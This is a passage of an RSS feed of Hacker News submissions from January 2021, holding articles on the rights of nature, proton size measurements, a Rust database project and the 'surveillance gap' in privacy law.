rights to nature could become society’s next major rights-based milestone as part of a larger movement toward the implementation of “Earth law” (like “human rights law” but for the planet). Establishing the rights of nature is an essential piece of the solution to the ecological crisis.</p><p><span>N</span>ot only does the rights of nature give ecosystems a voice in our legal system, it influences our culture. In the case of the Whanganui River, tens of thousands of people have learned how the Maori tribes that live along the Whanganui treat the river as their ancestor and see themselves as its guardians. Numerous global gatherings have celebrated the Whanganui River and other waterways that are now “persons.” A 2019 law journal article in <i>Ecology Law Quarterly</i> writes metaphorically about the “songs” of the Whanganui river and others—songs that are sad, discordant, muted, loving, trusting, or inspiring—and suggests to its predominantly legal readers, “Let us sit beside the river and wait patiently for its song.”<sup>7</sup> A new mindset is emerging in which humans learn to listen to and guard rivers rather than exploit them. The law influences culture, and culture influences the law.</p><p>Many varieties of cultural changes will accelerate the legal movement toward rights of nature. We can reinvent our language so that we no longer describe nature as our “property” or a “resource,” but rather refer to nature as persons, family members, kin, or co-inhabitants of the planet. Movies, songs, TV shows, books, and other artworks that showcase nature being alive and having its own rights can galvanize culture and will help fuel legal battles.</p><p>Timekeeping, too, can become part of the cultural movement toward the rights of nature. Specifically, we can create new standards of time that recognize our deep relationship with the natural world. Experimental philosopher, artist, and writer <a href="http://nautil.us/issue/79/catalysts/philosophy-is-a-public-service" target="_blank">Jonathon Keats</a> has collaborated with the Anchorage Museum to create <a href="http://alaskarivertime.org/" target="_blank">Alaska River Time</a>, which uses the natural flow of a river as a timekeeping standard. The speed of a clock increases or decreases based on the flow of a network of rivers. The clock speeds up when river flows are greatest, such as during spring runoff, then will slow nearly to a halt during low-flow periods, such as late-summer when much of the snowmelt has been depleted. Keats’ thought-experiment is a stark reminder that the natural world is indifferent …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://m.nautil.us/issue/94/evolving/humans-have-rights-and-so-should-nature">http://m.nautil.us/issue/94/evolving/humans-have-rights-and-so-should-nature</a></em></p>]]>
            </description>
            <link>http://m.nautil.us/issue/94/evolving/humans-have-rights-and-so-should-nature</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712528</guid>
            <pubDate>Sun, 10 Jan 2021 08:55:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top Ranked Tweets on Hacker News 2020]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25712499">thread link</a>) | @hgarg
<br/>
January 10, 2021 | https://harishgarg.com/writing/hacker-news-front-page-tweets-2020/ | <a href="https://web.archive.org/web/*/https://harishgarg.com/writing/hacker-news-front-page-tweets-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <ul>
<li>Data curated from <a target="_blank" rel="noopener" href="http://explorehackernews.xyz/?ref=harishgarg.com">Hacker News Front Page Explorer</a></li>
</ul>
<p>1.Every Google result now looks like an ad </p><p>2.macOS unable to open any non-Apple application </p><p>3.John Conway has died </p><p>4.iOS14 reveals that TikTok may snoop clipboard contents every few keystrokes </p><p>5.This electrical transmission tower has a problem </p><p>6.Apple does not keep the 30% commission on a refund </p><p>7.AWS forked my project and launched it as its own service </p><p>8.Google no longer providing original URL in AMP for image search results </p><p>9.Guido van Rossum joins Microsoft </p><p>10.When a customer refunds your paid app, Apple refunds its 30% cut </p>
<p>Get the Full list (162 records) <a target="_blank" rel="noopener" href="https://gum.co/hacker-news-tweets-2020">here for FREE</a></p>
<p>Want to run this and other kind of analysis on your own? Get the Full Database <a target="_blank" rel="noopener" href="http://explorehackernews.xyz/?ref=harishgarg.com">here</a></p>

  </div></div>]]>
            </description>
            <link>https://harishgarg.com/writing/hacker-news-front-page-tweets-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712499</guid>
            <pubDate>Sun, 10 Jan 2021 08:52:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Breakthrough in Measuring the Building Blocks of Nature]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25712475">thread link</a>) | @CapitalistCartr
<br/>
January 10, 2021 | http://m.nautil.us/blog/a-breakthrough-in-measuring-the-building-blocks-of-nature | <a href="https://web.archive.org/web/*/http://m.nautil.us/blog/a-breakthrough-in-measuring-the-building-blocks-of-nature">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

			<figure data-alt=""><img src="http://static.nautil.us/18082_ad5db5924e3e97ed8a387a499efa9fa0.jpg" width="733" alt=""><figcaption><span><i>An artistic rendering of the quarks and gluons that make up a proton.</i></span><span>Illustration by D. Dominguez / CERN</span></figcaption></figure><p><span>I</span>n a recent experiment done at the Max Planck Institute for Quantum Optics, in Germany, physicist Alexey Grinin and his colleagues came a step closer to resolving one of the more significant puzzles to have arisen in particle physics over the past decade. The puzzle is this: Ordinarily, when you set about measuring the size of something, you’d expect to get the same answer no matter what you use to measure it—a soda can has the diameter it does whether you measure it with a tape measure or callipers (provided these are properly calibrated, of course). Something must be amiss if your attempts to measure the can return different answers depending on the equipment, yet this is precisely what’s happened over multiple attempts to measure the spatial extent of a proton. What’s potentially at stake is our understanding of the building blocks of reality: the <a href="https://science.sciencemag.org/content/370/6520/1061.abstract" target="_blank">differing measurements</a> could be heralding the existence of new forces or particles.</p><p>What does it mean for a subatomic particle to have a measurable “size”? Mathematically, fundamental particles are idealized as point particles, which is to say that, as far as we can tell, they have no meaningfully discernible spatial extent, or substructure, at all. True, all fundamental particles are associated with a quantum mechanical wave packet, which does have a spatial extent that depends on the energy of the particle. Yet these basic bits of Lego are entities whose wave packets you can, in principle, pack into as small a region as you’d like before the very notion of continuum geometry starts, at the Planck scale, to lose meaning. Fundamental particles organize into something analogous to a mini periodic table—consisting of the various force carrying particles, such as photons and gluons (the carrier particles of the strong nuclear force), along with three generations of quarks and leptons and the mass-generating Higgs boson—and can stack together in different combinations to form a zoo of so-called composite particles.</p><blockquote><p>There is less than one in about a trillion chance that the discrepancy could be a statistical fluke.</p> </blockquote><p>Perhaps the most familiar and ubiquitous of these is the proton. With at least one in every kind of element, it’s made up of two up quarks and a down quark that dance around each other in a tightly bound orbit maintained by exchanging gluons. This exchange process is so energetic that most of the mass of the proton (or for that matter, most of the material that makes us up) derives from the energy contained in these gluons—a consequence, as Einstein informed us, of <i>E</i> being equal to <i>mc</i><sup>2</sup>.&nbsp;<br></p><figure data-alt=""><img src="http://static.nautil.us/18083_78b8d6620afcd434a4b7fb41b22e595b.png" width="733" alt=""><figcaption><span><i>Fundamental particles organize into something analogous to a mini periodic table (above).</i></span><span>CERN</span></figcaption></figure><p>So it’s not meaningless to ask what the “size” of the proton is. The study by Grinin’s team highlights the fact that defining this notion remains a rather tricky affair. And, as we’ll see, their results serve to sharpen the mystery as to why other measurement methods researchers have used previously disagree.<br></p><p>A physicist can reasonably infer a proton’s size from the “charge radius”—roughly the averaged spatial extent of quark orbits inside. This quantity is probed in slightly different ways by electrons and muons (another sort of fundamental particle), when you probe their orbital configurations as they form “bound states” with the proton—atomic hydrogen in the case of electrons, muonic hydrogen in the case of muons. Because muons are about 200 times heavier than electrons, their lowest energy orbital configurations are much more tightly bound around the proton than are electrons in atomic hydrogen. Consequently, the differences in the energies of various orbitals in muonic hydrogen are much more sensitive to the proton’s size as well as being more “high pitched” than that of regular atomic hydrogen.&nbsp;</p><p>In other words, similar to how plucking a guitar string at a given tension produces a much higher note were we to fret it open, or at 1/200th its open length, the typical frequencies of the radiation emitted by transitions in muonic hydrogen are about 200 times higher than that in atomic hydrogen. These frequencies relate to something called the Rydberg constant—the tension of the guitar string in the analogy—which appears to be one of the potentially more significant sources of uncertainty proton size-wise. Orbital energy levels depend on both this constant and the charge radius of the proton.</p><p>Proton-size measurements didn’t conflict for decades. Different methods—like measuring the radius by observing electrons orbit within hydrogen atoms, or by scattering energetic electrons off of unbound protons—had converged on a value of 0.875 (give or take 0.006) femtometers. That’s a little less than a trillionth of a millimeter. That convergence was disrupted in 2010, when a paper came out titled, “The size of the proton.” As the researchers reported, <a href="http://www.quantum.physik.uni-potsdam.de/teaching/ss2015/pqt/Pohl2010.pdf" target="_blank">measurements</a> involving orbital configurations in muonic hydrogen returned a value of 0.842, give or take 0.001 femtometers. This may not seem like much of a difference, but it’s the accompanying error bars that matter. The measurements are, individually, so precise that their disagreement is over seven standard deviations—there is less than one in about a trillion chance that the discrepancy could be a statistical fluke.</p><p>There are only two possibilities for the anomalous result if the equipment used in the experiments and their calibrations all check out after careful scrutiny. Either some combination of physical constants, which researchers assume in order to experimentally infer the proton charge radius, isn’t known as accurately as we thought, or there is something different about the way muons interact with protons, compared to electrons, that renders particle physics incomplete.</p><p>The latter possibility, if substantiated, would, of course, cause a flurry of excitement among theoretical physicists to say the least, as it could imply the existence of new forces and particles. Not only would it reshape our understanding of the universe, it would represent a throwback to the days when physicists discovered particles (<a href="https://timeline.web.cern.ch/anderson-and-neddermeyer-discover-muon" target="_blank">such as the muon itself</a>) using equipment that could fit on a proverbial tabletop.</p><div id="inpagesub">
	<p>Get the <span>Nautilus</span> newsletter</p>
<p>
	The newest and most popular articles delivered right to your inbox!
</p>
			<!-- Begin MailChimp Signup Form -->
			




</div><p>Over the past few years, various teams have been attempting to get to the bottom of the matter by looking at different orbital transitions in atomic hydrogen that are sensitive to different combinations of the Rydberg constant and the charge radius. A 2019 <a href="https://science.sciencemag.org/content/365/6457/1007" target="_blank">measurement</a> by a group of researchers at York University in Canada looked at a particular orbital transition that was independent of the value of this constant, finding a value of 0.833 ± 0.010 femtometers, consistent with the smaller value obtained in muonic hydrogen.&nbsp;</p><p>Grinin’s team went a step further. They used a technique known as frequency comb spectroscopy. It involves pulses of laser light that are a superposition of equally spaced frequencies—a ruler in frequency space if you will—that allowed them to look at two different orbital transitions in atomic hydrogen sensitive to two different combinations of the proton size and the Rydberg constant. This permitted them to determine both with unprecedented accuracy. The technique reduced, to only about one part in ten trillion, the observational uncertainties in the frequency of light these transitions emitted—a staggering degree of accuracy by any standard.&nbsp;</p><p>Not only did Grinin’s team find a value for the charge radius of the proton consistent with the value obtained in muonic hydrogen, they inferred a much more precise value for the Rydberg constant. This accounted for some part of the discrepancy seen in other measurements in atomic hydrogen (which presumed a less accurate value).</p><p>It thus appears that the experimental value of the proton charge radius Grinin’s team obtained in atomic hydrogen is converging on the smaller values for the proton charge radius other researchers initially obtained in muonic hydrogen. The smaller value has by now even been adopted as the <a href="https://physics.nist.gov/cgi-bin/cuu/Value?rp" target="_blank">official value</a> on the National Institute of Standards and Technology <a href="https://www.nist.gov/programs-projects/codata-values-fundamental-physical-constants" target="_blank">CODATA</a> list of recommended physical constants—the official almanac for nuclear and atomic chemists and physicists.&nbsp;</p><p>Although this convergence, based on the continued refinement of experimental techniques, did not deliver the new physics some may have been hoping for, even the most despondent theoretical physicist can acknowledge the experimental artistry that seems to be bringing the matter closer to conclusion. What remains unresolved is the reason why measurements, relying on different spectroscopic methods in atomic hydrogen, return different values for the charge radius of the proton. The mystery, and along with it, the diminishing hope of particle physicists, endures for the time being.&nbsp;</p><p>This was enough motivation for a team of theoretical physicists, led by Cliff Burgess at the Perimeter Institute, in Canada, to systematically catalogue all possible sources of theoretical uncertainty in atomic spectroscopy over a <a href="https://inspirehep.net/literature?sort=mostrecent&amp;size=25&amp;page=1&amp;q=find%20a%20burgess,%20c%20and%20a%20zalavari" target="_blank">series of papers</a>. By isolating the ways in which new forces and particles might leave a tell-tale signature, they’ve thrown the gauntlet firmly back to the experimentalists. Future experiments, as always, will be the ultimate arbiter in this matter.&nbsp;</p><p><i>Subodh Patil is an assistant professor at the Lorentz Institute for Theoretical Physics at Leiden University. He tweets on occasion at @_subodhpatil.</i></p>

		</div></div>]]>
            </description>
            <link>http://m.nautil.us/blog/a-breakthrough-in-measuring-the-building-blocks-of-nature</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712475</guid>
            <pubDate>Sun, 10 Jan 2021 08:48:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Libbpf-rs: eBPF for the Rust ecosystem]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25712357">thread link</a>) | @lukastyrychtr
<br/>
January 10, 2021 | https://dxuuu.xyz/libbpf-rs.html | <a href="https://web.archive.org/web/*/https://dxuuu.xyz/libbpf-rs.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://dxuuu.xyz/libbpf-rs.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712357</guid>
            <pubDate>Sun, 10 Jan 2021 08:32:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ace Coding Interviews]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25712317">thread link</a>) | @MatricksDeCoder
<br/>
January 10, 2021 | https://www.algoexpert.io/zed_developer | <a href="https://web.archive.org/web/*/https://www.algoexpert.io/zed_developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.algoexpert.io/zed_developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712317</guid>
            <pubDate>Sun, 10 Jan 2021 08:27:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reflecting on developing a database (2020 edition)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25712239">thread link</a>) | @lukastyrychtr
<br/>
January 10, 2021 | https://alex-dukhno.github.io/2020-12-31-Reflecting-on-developing-a-database-(2020-edition)/ | <a href="https://web.archive.org/web/*/https://alex-dukhno.github.io/2020-12-31-Reflecting-on-developing-a-database-(2020-edition)/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>I thought I would publish a post each month about what is happening with my <a href="https://github.com/alex-dukhno/database">database</a> project, but it turns out it requires more time and energy to do so <img title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"> Thus I will try to summarise my experience of developing a relational database and how it went in 2020 in this post.</p>

<h2 id="tldr-or-brief-history-of-my-journey">TL;DR or brief history of my journey</h2>

<p>I realize that I want to work on databases and SQL engines somewhere around the end of 2018. I didn’t know what to do except that to come up with a list of existing technologies with SQL capabilities and send my CV to companies that support and develop them. Most of them are open-source projects. At the end of 2019, I decided to try to contribute a code to some of them. One of the projects was <a href="https://github.com/hazelcast/hazelcast">Hazelcast</a>. I was invited to hiring interviews after a couple of months of contribution and joined the company on 3rd February of 2020. I have joined the Management Center team that develops a web-based product that manages Hazelcast clusters, reports metrics, and other functionality. Git history of <a href="https://github.com/alex-dukhno/database">database</a> project says that the first commit was on 20th April 2020. I have learned a lot about the internals of SQL engines since that time. There were many obstacles and problems I had to analyze and solve. That helped me gain invaluable experience. At some point, I realized how much I love developing these complicated “engineering beasts” and how web-based applications don’t motivate me to work. At the end of October, I decided to talk about this with my manager. That resulted in me joining the Hazelcast core subteam that works on a distributed SQL engine starting from 1st January 2021. That doesn’t mean I will stop working on my database project - it is the opposite. Now I have more time to gain experience in developing SQL engines.</p>

<p>For the rest of this post, I describe how my perception of what the SQL engine is and how it works changes over the year.</p>

<h2 id="sql-over-b-tree">SQL over B-Tree</h2>

<p>To get somehow started working on the database, I decided that it will be <a href="https://alex-dukhno.github.io/2017-05-17-There-is-just-no-just-in-software-development/">just</a> a <a href="https://github.com/ballista-compute/sqlparser-rs">sql parser</a> and a <a href="https://doc.rust-lang.org/std/collections/struct.BTreeMap.html">BTreeMap</a>. If the database receives an insert statement, it invokes <code>BTreeMap#insert</code>. If it receives an update statement, it invokes <code>BTreeMap#get</code> and then <code>BTreeMap#insert</code>. If it receives a delete statement, it invokes <code>BTreeMap#remove</code>. If it receives a select statement, it invokes <code>BTreeMap#values</code>. What could be easier than that, right?</p>

<p>After I typed in <code>BTreeMap</code> I realize that it had to be over some keys and values and couldn’t be generic of some <code>K</code> and <code>V</code> because I couldn’t know what tables users could create at runtime. So I decided to support only <code>i32</code> keys and values. It didn’t take me much to write code to see my idea works. Something like:</p>

<div><div><pre><code><span>let</span> <span>stmt</span> <span>=</span> <span>sqlparser</span><span>::</span><span>Parser</span><span>::</span><span>parse</span><span>(</span><span>"insert into t values(1)"</span><span>);</span>
<span>process</span><span>(</span><span>stmt</span><span>);</span>
<span>let</span> <span>stmt</span> <span>=</span> <span>sqlparser</span><span>::</span><span>Parser</span><span>::</span><span>parse</span><span>(</span><span>"select * from t"</span><span>);</span>
<span>print_selected_data</span><span>(</span><span>stmt</span><span>);</span>
</code></pre></div></div>

<h2 id="server-and-other-parts">Server and other parts</h2>

<p>The next was … client. I knew that it would be hard to develop two applications: client and server, and even harder to develop a communication protocol between them, so I decided: “Ok, let database implements <code>PostgreSQL</code> wire protocol, and I could use <code>psql</code> for testing” Sounds easier than done… I spent a couple of days googling a simple example of server-side implementation of a <code>PostgreSQL</code> wire protocol. All databases that I knew implement protocol incorporated it so much in their query execution flow that I couldn’t understand what is what and why it all was needed. That is why I decided to build a rust crate for easier server-side implementations of the protocol. First, it lived as a cargo module, but after six months and a lot of contribution from <a href="https://github.com/silathdiir">Steven</a>, I decided to give it a go and extract it into a separate <a href="https://github.com/alex-dukhno/pg_wire">pg_wire</a> crate.</p>

<h2 id="types">Types</h2>

<p><code>PostgreSQL</code> wire protocol supports two modes of passing queries between client and server: <code>Simple</code> and <code>Extended</code>. In the <code>Simple</code> mode, a client sends a query as a string, and the server processes it. In the <code>Extended</code> mode, the client and server exchange messages. They do so to figure out what variable parameters the client uses, what their types are, and so on. The database should have a type system to support the <code>Extended</code> mode. And I have to tell you it is much interesting to watch how your database can handle not only <code>insert into table_name values (1);</code> but also <code>insert into table_name values ('here a string');</code>. After that <code>BTreeMap</code> was transformed from <code>BTreeMap&lt;i32, i32&gt;</code> into <code>BTreeMap&lt;Vec&lt;u8&gt;, Vec&lt;u8&gt;&gt;</code>. I used a <code>|</code> symbol to separate column values. Map values were split by <code>|</code> and transformed into plain <code>String</code>s - thank God <code>PostgreSQL</code> wire protocol supports text and binary communication between client and server <img title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>

<h2 id="what-is-a-query-execution-pipeline">What is a query execution pipeline?</h2>

<p>If you are interested in the topic of databases you probably read from books, articles, or watched presentations from conferences then you probably know that before executing a query a database does parsing, analysis, optimizing, building a plan for the query, and only then executes it. As I moving along in my database development these phases emerged. In the beginning, it was parsing and executing phases. Then I wanted to do more interesting <code>select</code>s with <code>where</code> clause, I realized that the database has to build some sort of query plan: what columns to select from which table and how to filter data that is not needed. At that time the database had intertwined plan and execution phases to support the <code>Extended</code> mode of <code>PostgreSQL</code> protocol. To overcome that I started the development of a query analyzer. At some point, I realized that there is no much difference in <code>sqlparaser::ast</code> and <code>plan</code> structure that are passed and transformed from one into another. Developing that idea I realized that there are at least three different expression trees in the SQL query. The first one is each of the <code>values</code> in an <code>insert</code> statement. The second one is each assignment inside <code>update</code> queries and projection items in <code>select</code> queries. The difference between them very small to notice, <code>insert</code>’s values do not support column name in an expression but <code>update</code>’s assignments and <code>select</code>’s projection items do. The third one is the predicates in <code>select</code>’s <code>where</code>, <code>having</code> clauses and data definition’s <code>check</code> constraints. In the third variant, a predicate tree to be valid has to have the resulting <code>bool</code> type after an evaluation. These details seem insignificant but by realizing them I could see how much simpler query validation could be. Each type of query could have a separate validation code with some generality e.g. <code>select</code>s, <code>delete</code>s and <code>update</code>s have <code>where</code> clause. It triggered a massive refactoring and redesign. After a month of work, I merged <a href="https://github.com/alex-dukhno/database/pull/438">the first PR</a> that contains 8k lines of changes a week ago and <a href="https://github.com/alex-dukhno/database/pull/454">the second one</a> is coming.</p>

<p>To summaries my post somehow, I would like to wish everyone to find a domain where you want to build software in so much that if one day you realize that you have take a completely different approach (like throwing away everything and start over) you could no matter what accept it and continue your journey full of discovery and fun.</p>

<p>Happy New Year everyone!</p>

      </article></div>]]>
            </description>
            <link>https://alex-dukhno.github.io/2020-12-31-Reflecting-on-developing-a-database-(2020-edition)/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712239</guid>
            <pubDate>Sun, 10 Jan 2021 08:16:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Surveillance Gap: The Harms of Extreme Privacy and Data Marginalization]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25712065">thread link</a>) | @sampling
<br/>
January 9, 2021 | https://socialchangenyu.com/review/the-surveillance-gap-the-harms-of-extreme-privacy-and-data-marginalization/ | <a href="https://web.archive.org/web/*/https://socialchangenyu.com/review/the-surveillance-gap-the-harms-of-extreme-privacy-and-data-marginalization/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
			
			
						<div>
     <main>
        <section>
                                                                
                                                <article>
                            <header>
                                
                            </header>
                                                                                                
                                                                                                                        
                                                                                    <div>
                                
                                <div>
                                    <div>
                                                                                                                                    <section id="introduction">
                                                    
                                                    <div>
                                                        <p>Michele Gilman and Rebecca Green <span title="1: Venable Professor of Law and Director, Clinical Legal Education, University of Baltimore School of Law, and Professor of Practice; Co-Director of the Election Law Program, William &amp; Mary Law School. For their helpful feedback, the authors wish to thank the participants at the Privacy Law Scholars Workshop at the U.C. Berkeley School of Law in 2017, including danah boyd, Matt Cagle, Danielle Citron, Gautum Hans, Anna Lauren Hoffman, Margaret Hu, Sarah Igo, Mary Madden, Aaron Massey, Charles Raab, Andrew Selbst, and Luke Stark. We also thank Laura Heymann." data-indicator="∞" data-footnum="1">∞</span></p>
<h3><strong>Abstract</strong></h3>
<p>We live in an age of unprecedented surveillance, enhanced by modern technology,&nbsp;prompting some to suggest that privacy is dead.&nbsp;Previous scholarship suggests that no subset of the population feels this phenomenon more than marginalized communities. Those who rely on public benefits, for example, must turn over personal information and submit to government surveillance far more routinely than wealthier citizens who enjoy greater opportunity to protect their privacy and the ready funds to secure it. This article illuminates the other end of the spectrum, arguing that many individuals who may value government and nonprofit services and legal&nbsp;protections&nbsp;fail to enjoy these benefits because they reside in a “surveillance gap.” These people include&nbsp;undocumented immigrants, day laborers, homeless persons, and people with felony conviction histories&nbsp;suffering collateral consequences of their&nbsp;convictions.&nbsp;Members of these groups often remain outside of the mainstream data flows and institutional attachments necessary to flourish in American society.&nbsp;The harms that surveillance gap residents experience can be severe, such as&nbsp;physical and mental health injuries and lack of economic stability, as well as&nbsp;data marginalization&nbsp;and resulting invisibility to policymakers. In short, having too much privacy can be as injurious as having too little.</p>
<p>The sources of the&nbsp;surveillance gap range from&nbsp;attempts to contain and control marginalized groups to data silos to economic exploitation.&nbsp;This article explores the boundaries of the surveillance gap, evaluates how this emerging concept fits within existing privacy paradigms and theoretical frameworks, and suggests possible solutions to enhance the autonomy and dignity of marginalized people within the surveillance gap.</p>
                                                    </div>
                                                </section>
                                                                                            <section id="i-introduction">
                                                    
                                                    <div>
                                                        <p>Although we live in a highly surveilled society, some people among us are functionally invisible. For example, low-wage workers—many of whom are undocumented immigrants—toil out of sight in an underground economy. A lack of a conventional paper trail or pay stub system linking workers to employers exposes these workers to potential wage theft and dangerous working conditions.<span title="2: See Stephen Lee, Policing Wage Theft in the Day Labor Market, 4 U.C. Irvine L. Rev. 655, 659–60 (2014) (“A coarse definition of day labor is temporary work in which the work, and often the workers, lack documentation.”)." data-indicator="1" data-footnum="2">1</span> While these workers are perilously out of reach of government and nonprofit organizations that could otherwise provide assistance,<span title="3: Infra Part II.B." data-indicator="2" data-footnum="3">2</span><sup>&nbsp;&nbsp;</sup>they are also subject to heightened forms of surveillance, typically under the increasingly watchful eye of agencies like Immigration and Customs Enforcement. Likewise, homeless persons’ lives are defined by extremes: although they tend to live their lives in public, they are simultaneously governed by laws that criminalize their behavior, steadily pushing them out of view. Tellingly, when former Governor of Virginia Terry McAuliffe sought to restore the ability to vote to constituents who had committed felony crimes, his office was unable to find thousands of people—people who at one point spent time in the prison and parole systems where their whereabouts were always known to authorities.<span title="4: See Howell v. McAuliffe, 788 S.E. 2d 706, 710 (2016) (“McAuliffe’s Executive Order stated that it removed the political disabilities of approximately 206,000 Virginians who had been convicted of a felony but who had completed their sentences of incarceration and any periods of supervised release, including probation and parole.”); ACLU of Va., ACLU of Virginia Challenges Governor McDonnell to Restore Voting Rights to Greatest Number Possible (June 25, 2013), https://acluva.org/en/press-releases/aclu-virginia-challenges-governor-mcdonnell-restore-voting-rights-greatest-number [https://perma.cc/J9AK-L4E5] (noting that over 350,000 disenfranchised Virginians awaited restoration of their rights)." data-indicator="3" data-footnum="4">3</span> These examples illustrate that marginalized people experience privacy differently than most Americans. Specifically, they experience privacy extremes—being seen or tracked too much or too little.</p>
<p>Existing privacy scholarship has largely focused on the harms derived from too little privacy, and, in this vein, several scholars have highlighted the particularly intense surveillance of low-income people.<span title="5: See, e.g., Michele Estrin Gilman, The Class Differential in Privacy Law, 77 Brook. L. Rev. 1389, 1392–95 (2012) [hereinafter Class Differential]; Wendy A. Bach, The Hyperregulatory State: Women, Race, Poverty, and Support, 25 Yale J.L. &amp; Fem. 317, 331–32 (2014); Kaaryn Gustafson, Degradation Ceremonies and the Criminalization of Low-Income Women, U.C. Irvine L. Rev. 297, 312–21 (2013); see generally Virginia Eubanks, Automating Inequality: How High-Tech Tools Profile, Police, and Punish the Poor (2017) (describing how digital data collection and algorithmic decision-making processes target and harm the poor); Khiara M. Bridges, The Poverty of Privacy Rights (2017) (describing how poor mothers in the United States lack a right to privacy); John Gilliom, Overseers of the Poor: Surveillance, Resistance and the Limits of Privacy (2001) (describing the hyper-surveillance and lack of privacy rights of a population of women on public assistance in rural Appalachia)." data-indicator="4" data-footnum="5">4</span> This article examines the other end of the spectrum—the surveillance gap. Life in the surveillance gap can be isolating, stigmatizing, dangerous, and harmful to a person’s physical and mental health. For one, legal protections available to other members of society remain out of reach to those in the surveillance gap. People also lose out on potential sources of economic and social support, because those who seek to provide services to disadvantaged members of our society often find it nearly impossible to reach them. Moreover, those who fall within the surveillance gap are not included within big data streams&nbsp;that ultimately shape public policy, thus leaving out their experiences and needs from the calculus that goes into creating policy.<span title="6: Daniel Castro, Ctr. on Data Innovation, The Rise of Data Poverty in America (Sept. 10, 2014), http://www2.datainnovation.org/2014-data-poverty.pdf [https://perma.cc/J7Y7-FB7Q]." data-indicator="5" data-footnum="6">5</span> Frustratingly, the challenges facing these groups remain invisible, further entrenching these groups’ marginalization.</p>
<p>The surveillance gap has multiple causes, ranging from data silos to poor data sharing, and from benign neglect to administrative systems that purposefully exclude certain people. This article seeks to identify and understand the causes, contours, and consequences of the surveillance gap and to outline legal and policy tools for addressing it. Part II provides case studies of populations living in the surveillance gap, including undocumented immigrants, day laborers, homeless persons, and people with felony conviction histories. Part III situates the surveillance gap within several scholarly streams. First, it assesses the surveillance gap through the lens of scholarship that differentiates between privacy harms experienced by varying groups. Second, it builds on insights from feminist legal theory involving the public/private binary and the harms associated with having too much privacy, wrestling with the tensions identified by feminists between liberalism’s ideals and individuals’ lived realities. Third, it examines notions of “choice” and “consent” in consumer and criminal privacy law, testing whether such frameworks are meaningful with regard to marginalized groups. Fourth, it adds a new dimension to emerging concepts of privacy as contextual. Fifth, it reviews fundamental rights theory’s impact on the surveillance gap, positing that the gap cannot be found in legal regimes that view privacy as a fundamental human right, such as in the European Union. Part IV suggests ways to address harms that arise in the surveillance gap while also respecting desirable forms of privacy and the dignity and autonomy of marginalized persons.<a href="#_ftnref1" name="_ftn1"></a></p>
                                                    </div>
                                                </section>
                                                                                            <section id="ii-life-within-the-surveillance-gap">
                                                    
                                                    <div>
                                                        <p>The rise of the surveillance state is well documented.<span title="7: See generally Michel Foucault, Discipline and Punish: The Birth of the Prison (1977); David Garland, The Culture of Control: Crime and Social Order in Contemporary Society (2001); Kevin D. Haggerty &amp; Richard V. Ericson, The Surveillant Assemblage, 51 British J. Soc. 605 (2000)." data-indicator="6" data-footnum="7">6</span> Both state and non-state institutions routinely record individual actions to an unprecedented degree. Americans have famously been warned: “[p]rivacy is dead, get over it.”<span title="8: See Jeffrey Bellin, eHearsay, 98 Minn. L. Rev. 7, 18 (2013) (discussing source of the quote); see also Mary Kay Mallonee &amp; Eugene Scott, Comey: ‘There Is No Such Thing as Absolute Privacy in America’, CNN (Mar. 9, 2017), http://www.cnn.com/2017/03/08/politics/james-comey-privacy-cybersecurity/index.html [https://perma.cc/F6XG-9ULF]; Marshall Kirkpatrick, Face‌book’s Zuckerberg Says the Age of Privacy Is Over, ReadWriteWeb (Jan. 9, 2010, 9:25 PM), https://readwrite.com/2010/01/09/facebooks_zuckerberg_says_the_age_of_privacy_is_ov/ [https:‌//perma.cc/T5S7-NKDK]." data-indicator="7" data-footnum="8">7</span> The so-called death of privacy stems from two main sources. First are the increasingly sophisticated tools that the government uses to monitor and track the populace. Fear of the government’s abuse of these tools has prompted some federal and state laws to protect Americans’ privacy,<span title="9: See, e.g., the Privacy Act, 5 U.S.C. § 552a, and the Electronic Communications Privacy Act, Pub. L. No. 99-508, 100 Stat. 1848 (1986)&nbsp;(codified as amended at&nbsp;18 U.S.C. §§ 2510–22,&nbsp;27‌01–12, 3121–26 (2012)), and their state equivalents." data-indicator="8" data-footnum="9">8</span> although government surveillance at all levels is ever expanding and broader than most people realize.<span title="10: See generally Jennifer Stisa Granick, American Spies: Modern Surveillance, Why You Should Care, and What to Do About It 9–26 (2017)." data-indicator="9" data-footnum="10">9</span> The second source derives from the private sector. To say that companies have come to appreciate the value of consumer data is a gross understatement. Companies now regularly collect, aggregate, buy, and sell 